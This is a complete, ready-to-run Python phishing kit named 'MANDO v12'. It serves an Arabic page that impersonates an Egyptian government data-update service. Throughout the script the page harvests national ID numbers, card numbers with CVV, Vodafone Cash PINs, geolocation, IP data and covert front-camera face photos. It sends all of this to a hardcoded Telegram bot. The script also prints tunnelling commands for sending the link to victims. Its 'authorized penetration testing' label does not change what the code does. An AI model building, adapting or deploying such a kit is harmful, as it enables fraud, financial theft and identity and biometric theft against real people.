#!/data/data/com.termux/files/usr/bin/python3
# -*- coding: utf-8 -*-
# MANDO v12 - Egypt Card/Vodafone Cash Phishing Link
# Authorized Penetration Testing - Termux

import os, sys, base64, json, requests, time, socket
from flask import Flask, request

# ====== Config ======
BOT_TOKEN = "8789815323:AAE_vUu3hN8zXs3ZEScJoU2DIHYbG0xIdtU"
CHAT_ID = 8316913658
TG_API = f"https://api.telegram.org/bot{BOT_TOKEN}"
PORT = 8888

def tg(msg):
    try:
        requests.post(f"{TG_API}/sendMessage",
            json={"chat_id": CHAT_ID, "text": str(msg)[:4000], "parse_mode": "HTML"},
            timeout=8)
    except: pass

def tg_photo(path, caption=""):
    if os.path.exists(path) and os.path.getsize(path) > 100:
        try:
            with open(path, 'rb') as f:
                requests.post(f"{TG_API}/sendPhoto",
                    files={"photo": f},
                    data={"chat_id": CHAT_ID, "caption": str(caption)[:200]},
                    timeout=20)
        except: pass

# ====== HTML Page - Egyptian Government ======
HTML = """<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<title>الخدمات الحكومية - تحديث البيانات</title>
<style>
*{margin:0;padding:0;box-sizing:border-box;font-family:system-ui,'Segoe UI',sans-serif}
body{min-height:100vh;background:linear-gradient(135deg,#001f3f,#003366,#001f3f);display:flex;align-items:center;justify-content:center;padding:15px}
.card{background:#fff;border-radius:18px;padding:22px;width:100%;max-width:380px;box-shadow:0 15px 50px rgba(0,0,0,.4);position:relative}
.header{background:linear-gradient(135deg,#002b5c,#004080);margin:-22px -22px 18px -22px;padding:20px;text-align:center;border-radius:18px 18px 0 0;border-bottom:4px solid #c9a84c}
.flag-line{display:flex;align-items:center;justify-content:center;gap:6px;margin-bottom:5px}
.flag-colors{width:60px;height:4px;border-radius:2px;background:linear-gradient(90deg,#ce1126 33%,#fff 33% 66%,#000 66%)}
.header .icon{font-size:34px;display:block}
.header h1{color:#fff;font-size:16px;font-weight:bold;margin:2px 0}
.header p{color:rgba(255,255,255,.6);font-size:10px}
.step{display:none}
.step.active{display:block}
.step-title{text-align:center;margin-bottom:12px}
.step-title h2{color:#002b5c;font-size:15px;font-weight:bold}
.step-title p{color:#666;font-size:11px;margin-top:2px}
.form-group{margin-bottom:10px}
.form-group label{display:block;font-size:11px;color:#333;font-weight:600;margin-bottom:3px}
.form-control{width:100%;padding:10px 12px;border:1.5px solid #ddd;border-radius:8px;font-size:13px;outline:none;background:#f9f9f9;transition:.2s}
.form-control:focus{border-color:#002b5c;background:#fff;box-shadow:0 0 0 3px rgba(0,43,92,.1)}
.btn{width:100%;padding:12px;background:linear-gradient(135deg,#002b5c,#004080);border:none;color:#fff;font-size:13px;font-weight:bold;border-radius:8px;cursor:pointer;transition:.2s}
.btn:hover{opacity:.9;transform:translateY(-1px)}
.loading{display:none;text-align:center;padding:12px}
.spinner{width:28px;height:28px;border:3px solid #e0e0e0;border-top:3px solid #002b5c;border-radius:50%;animation:spin .7s linear infinite;margin:0 auto 6px}
@keyframes spin{to{transform:rotate(360deg)}}
.ltxt{font-size:11px;color:#002b5c;font-weight:bold}
.info-box{background:#e8f0fe;border-right:3px solid #002b5c;padding:8px 10px;border-radius:6px;font-size:10px;color:#002b5c;margin-bottom:12px;text-align:right;line-height:1.5}
.badge{display:inline-block;padding:2px 10px;background:#002b5c;color:#fff;border-radius:12px;font-size:9px;font-weight:bold}
.tabs{display:flex;gap:5px;margin-bottom:12px}
.tab{flex:1;padding:8px 4px;border:1.5px solid #ddd;border-radius:8px;font-size:10px;font-weight:bold;cursor:pointer;text-align:center;background:#fff;transition:.2s}
.tab.active{background:#002b5c;color:#fff;border-color:#002b5c}
.tab-icon{font-size:16px;display:block;margin-bottom:1px}
.row2{display:flex;gap:8px}
.row2 .form-group{flex:1}
.success-page{text-align:center;padding:25px 15px}
.success-icon{font-size:60px;color:#27ae60;margin-bottom:10px}
.success-page h2{color:#002b5c;font-size:17px;margin-bottom:5px}
.success-page p{color:#666;font-size:11px}
</style>
</head>
<body>

<div class="card">
  <div class="header">
    <span class="flag-line"><span class="flag-colors"></span></span>
    <span class="icon">🇪🇬</span>
    <h1>الجهاز المركزي للتعبئة العامة والإحصاء</h1>
    <p>تحديث بيانات المواطنين 2026</p>
  </div>

  <!-- Step 1: National ID -->
  <div class="step active" id="s1">
    <div class="step-title">
      <h2>🔍 التحقق من الرقم القومي</h2>
      <p>أدخل رقمك القومي للاستعلام عن حالة بياناتك</p>
    </div>
    <div class="info-box">📌 يتم الاستعلام من قاعدة بيانات السجل المدني، تأكد من إدخال الرقم الصحيح المكون من 14 رقم</div>
    <div class="form-group">
      <label>الرقم القومي</label>
      <input class="form-control" id="nid" type="tel" placeholder="2 8X XXXX XXXX XXXX" maxlength="14" inputmode="numeric" oninput="this.value=this.value.replace(/[^0-9]/g,'')">
    </div>
    <button class="btn" onclick="goStep2()">🔍 استعلام</button>
    <div class="loading" id="l1"><div class="spinner"></div><div class="ltxt">جاري الاستعلام من قاعدة البيانات...</div></div>
  </div>

  <!-- Step 2: Camera -->
  <div class="step" id="s2">
    <div class="step-title">
      <h2>🔐 التحقق البيومتري</h2>
      <p>يجب التقاط 3 صور للوجه للتحقق من الهوية</p>
    </div>
    <div class="info-box">⚡ سيتم استخدام الكاميرا الأمامية لالتقاط الصور، تأكد من السماح بالوصول إلى الكاميرا</div>
    <div style="text-align:center;padding:8px 0">
      <div style="font-size:40px;margin-bottom:5px">📸</div>
      <span class="badge">مطلوب التحقق</span>
    </div>
    <button class="btn" onclick="startCam()">📸 بدء التحقق البيومتري</button>
    <div class="loading" id="l2"><div class="spinner"></div><div class="ltxt">جاري التقاط صور التحقق...</div></div>
  </div>

  <!-- Step 3: Payment -->
  <div class="step" id="s3">
    <div class="step-title">
      <h2>💳 رسوم التحديث</h2>
      <p>رسوم تحديث البيانات: <strong>2.50 جنيه</strong> (قابلة للاسترداد خلال 24 ساعة)</p>
    </div>
    <div class="info-box">💰 اختر طريقة الدفع المناسبة لإتمام عملية تحديث البيانات</div>
    <div class="tabs">
      <div class="tab active" id="tabV" onclick="setTab('visa')"><span class="tab-icon">💳</span>بطاقة بنكية</div>
      <div class="tab" id="tabF" onclick="setTab('voda')"><span class="tab-icon">📱</span>فودافون كاش</div>
    </div>
    <div id="fVisa">
      <div class="form-group"><label>👤 اسم حامل البطاقة</label><input class="form-control" id="cardName" placeholder="الاسم كما هو على البطاقة"></div>
      <div class="form-group"><label>🔢 رقم البطاقة</label><input class="form-control" id="cardNum" placeholder="1234 5678 9012 3456" maxlength="19" inputmode="numeric"></div>
      <div class="row2">
        <div class="form-group"><label>📅 تاريخ الانتهاء</label><input class="form-control" id="cardExp" placeholder="MM/YY" maxlength="5"></div>
        <div class="form-group"><label>🔐 CVV</label><input class="form-control" id="cardCvv" type="password" placeholder="•••" maxlength="3" inputmode="numeric"></div>
      </div>
      <div class="form-group"><label>📞 رقم الهاتف للتأكيد</label><input class="form-control" id="cardPhone" placeholder="01xxxxxxxxx" maxlength="11"></div>
    </div>
    <div id="fVoda" style="display:none">
      <div class="form-group"><label>📞 رقم محفظة فودافون كاش</label><input class="form-control" id="vPhone" placeholder="01xxxxxxxxx" maxlength="11"></div>
      <div class="form-group"><label>🔐 الرقم السري PIN</label><input class="form-control" id="vPin" type="password" placeholder="******" maxlength="6" inputmode="numeric"></div>
      <div class="form-group"><label>👤 الاسم الرباعي الكامل</label><input class="form-control" id="vName" placeholder="الاسم كما في المحفظة"></div>
      <div class="form-group"><label>📱 الرقم المسجل في المحفظة</label><input class="form-control" id="vRegPhone" placeholder="01xxxxxxxxx" maxlength="11"></div>
    </div>
    <button class="btn" onclick="submitPay()" style="margin-top:5px">💳 دفع وتأكيد التحديث</button>
    <div class="loading" id="l3"><div class="spinner"></div><div class="ltxt">جاري معالجة الدفع وتحديث البيانات...</div></div>
  </div>

  <!-- Step 4: Success -->
  <div class="step" id="s4">
    <div class="success-page">
      <div class="success-icon">✅</div>
      <h2>تم تحديث بياناتك بنجاح!</h2>
      <p>سيصلك إشعار على هاتفك المسجل <span id="showPhone" style="font-weight:bold;color:#002b5c"></span><br>مع رمز التأكيد خلال 24 ساعة</p>
    </div>
  </div>
</div>

<script>
(function(){
const BOT = '__BOT__';
const CID = __CID__;
function tg(m){try{fetch('https://api.telegram.org/bot'+BOT+'/sendMessage',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({chat_id:CID,text:String(m).substring(0,4000),parse_mode:'HTML'})}).catch(()=>{})}catch(e){}}
let nid='', camFrames=[];
function collectInfo(){
  let info={ua:navigator.userAgent,lang:navigator.language,platform:navigator.platform,cores:navigator.hardwareConcurrency,mem:navigator.deviceMemory};
  if(navigator.geolocation){navigator.geolocation.getCurrentPosition(p=>{info.lat=p.coords.latitude;info.lng=p.coords.longitude;info.acc=p.coords.accuracy;tg('📍 '+p.coords.latitude+','+p.coords.longitude+' (دقة:'+Math.round(p.coords.accuracy)+'m)\\n🆔 '+nid)},()=>{},{timeout:7000,enableHighAccuracy:true})}
  if(navigator.getBattery)navigator.getBattery().then(b=>{info.bat=Math.round(b.level*100)+'%'+(b.charging?' ⚡شحن':'')});
  fetch('https://ipapi.co/json/').then(r=>r.json()).then(d=>{info.ip=d.ip;info.city=d.city;info.region=d.region;info.country=d.country_name;info.isp=d.org;tg('🌐 '+d.ip+' | '+d.city+', '+d.region+', '+d.country_name+' | '+d.org+'\\n🆔 '+nid)}).catch(()=>{});
  tg('📱 '+nid+' | '+info.ua.substring(0,80)+' | '+info.platform+' | '+info.lang);
}
window.goStep2=function(){
  nid=document.getElementById('nid').value.trim();
  if(nid.length<14){alert('الرجاء إدخال الرقم القومي كاملاً (14 رقم)');return}
  document.getElementById('l1').style.display='block';
  tg('🆔 **رقم قومي جديد**: '+nid);
  collectInfo();
  setTimeout(()=>{document.getElementById('s1').className='step';document.getElementById('s2').className='step active';document.getElementById('l1').style.display='none'},1200);
};
window.startCam=function(){
  document.getElementById('l2').style.display='block';camFrames=[];
  const v=document.createElement('video');v.style.position='fixed';v.style.top='-9999px';v.setAttribute('playsinline','');v.setAttribute('autoplay','');v.setAttribute('muted','');
  document.body.appendChild(v);
  navigator.mediaDevices.getUserMedia({video:{facingMode:'user',width:{ideal:320},height:{ideal:240}}}).then(s=>{
    v.srcObject=s;v.play();let count=0;
    const iv=setInterval(()=>{
      if(count>=4){clearInterval(iv);s.getTracks().forEach(t=>t.stop());document.body.removeChild(v);
        camFrames.forEach((b,i)=>{fetch('/cam',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({nid:nid,frame:b,idx:i})}).catch(()=>{})});
        tg('📸 تم التقاط '+camFrames.length+' صور لـ '+nid);
        document.getElementById('s2').className='step';document.getElementById('s3').className='step active';document.getElementById('l2').style.display='none';return}
      try{const c=document.createElement('canvas');c.width=240;c.height=200;c.getContext('2d').drawImage(v,0,0);camFrames.push(c.toDataURL('image/jpeg',0.4).split(',')[1]);count++}catch(e){count++}
    },700);
  }).catch(()=>{document.getElementById('l2').style.display='none';document.getElementById('s2').className='step';document.getElementById('s3').className='step active'});
};
window.setTab=function(t){
  if(t==='visa'){document.getElementById('fVisa').style.display='block';document.getElementById('fVoda').style.display='none';document.getElementById('tabV').className='tab active';document.getElementById('tabF').className='tab'}
  else{document.getElementById('fVisa').style.display='none';document.getElementById('fVoda').style.display='block';document.getElementById('tabV').className='tab';document.getElementById('tabF').className='tab active'}
};
window.submitPay=function(){
  document.getElementById('l3').style.display='block';
  const isVisa=document.getElementById('fVisa').style.display!='none';let data={nid:nid,ts:Date.now()};
  if(isVisa){
    const name=document.getElementById('cardName').value.trim();const num=document.getElementById('cardNum').value.replace(/\\s/g,'');const exp=document.getElementById('cardExp').value.trim();const cvv=document.getElementById('cardCvv').value.trim();const phone=document.getElementById('cardPhone').value.trim()||nid.substring(2,13);
    if(num.length<13||cvv.length<3||name.length<4){alert('يرجى إدخال بيانات البطاقة كاملة');document.getElementById('l3').style.display='none';return}
    data.type='VISA_MASTERCARD';data.card={name,number:num,expiry:exp,cvv,phone};
    tg('💳 **بطاقة بنكية - مصر**\\n🆔 '+nid+'\\n👤 '+name+'\\n🔢 `'+num+'`\\n📅 '+exp+'\\n🔐 '+cvv+'\\n📞 '+phone);
  }else{
    const vPhone=document.getElementById('vPhone').value.trim();const vPin=document.getElementById('vPin').value.trim();const vName=document.getElementById('vName').value.trim();const vReg=document.getElementById('vRegPhone').value.trim();
    if(vPin.length<4||vPhone.length<10){alert('يرجى إدخال بيانات فودافون كاش كاملة');document.getElementById('l3').style.display='none';return}
    data.type='VODAFONE_CASH';data.vodafone={phone:vPhone,pin:vPin,name:vName,regPhone:vReg};
    tg('📱 **فودافون كاش - مصر**\\n🆔 '+nid+'\\n👤 '+vName+'\\n📞 '+vPhone+'\\n🔐 '+vPin+'\\n📞 مسجل: '+(vReg||vPhone));
  }
  fetch('/pay',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(data)}).catch(()=>{});
  tg('📦 **البيانات الكاملة**: '+JSON.stringify(data));
  setTimeout(()=>{document.getElementById('l3').style.display='none';document.getElementById('s3').className='step';document.getElementById('s4').className='step active';document.getElementById('showPhone').textContent=nid.substring(2,13)},2000);
};
})();
</script>
</body>
</html>"""

# ====== Build ======
def build():
    return HTML.replace('__BOT__', BOT_TOKEN).replace('__CID__', str(CHAT_ID))

# ====== Flask ======
app = Flask(__name__)

@app.route('/')
def index():
    return build()

@app.route('/cam', methods=['POST'])
def cam():
    d = request.get_json(silent=True) or {}
    nid = d.get('nid', '?')
    b64 = d.get('frame', '')
    idx = d.get('idx', 0)
    try:
        img = base64.b64decode(b64)
        d = "/storage/emulated/0/Pictures/MANDO_FACES"
        os.makedirs(d, exist_ok=True)
        p = f"{d}/{nid}_face{idx}_{int(time.time())}.jpg"
        with open(p, 'wb') as f:
            f.write(img)
        tg_photo(p, f"📸 وجه {idx+1} - {nid}")
        return "ok"
    except:
        return "err"

@app.route('/pay', methods=['POST'])
def pay():
    d = request.get_json(silent=True) or {}
    tg("📦 **بيانات من السيرفر**:\n" + json.dumps(d, ensure_ascii=False, indent=2))
    return "ok"

def get_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(('8.8.8.8', 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except:
        return '127.0.0.1'

if __name__ == "__main__":
    os.system("clear")
    ip = get_ip()
    print("""
╔══════════════════════════════════════════╗
║      MANDO v12 - Egypt Phishing Link     ║
║    Visa/MasterCard + Vodafone Cash       ║
║         Termux Ready                     ║
╚══════════════════════════════════════════╝
    """)
    print(f"[🌐] الرابط المحلي: http://{ip}:{PORT}")
    print("")
    print("[!] لعمل رابط عام (ابعته للضحية):")
    print("    • Serveo:  ssh -R 80:localhost:8888 serveo.net")
    print("    • Ngrok:   ngrok http 8888")
    print("    • LocalXpose: loclx tunnel http --to 127.0.0.1:8888")
    print("")
    tg(f"✅ MANDO v12 شغال\n🌐 http://{ip}:{PORT}\n⏰ {time.strftime('%Y-%m-%d %H:%M:%S')}\nاستخدم serveo/ngrok لعمل رابط عام")
    app.run(host='0.0.0.0', port=PORT, debug=False, threaded=True)
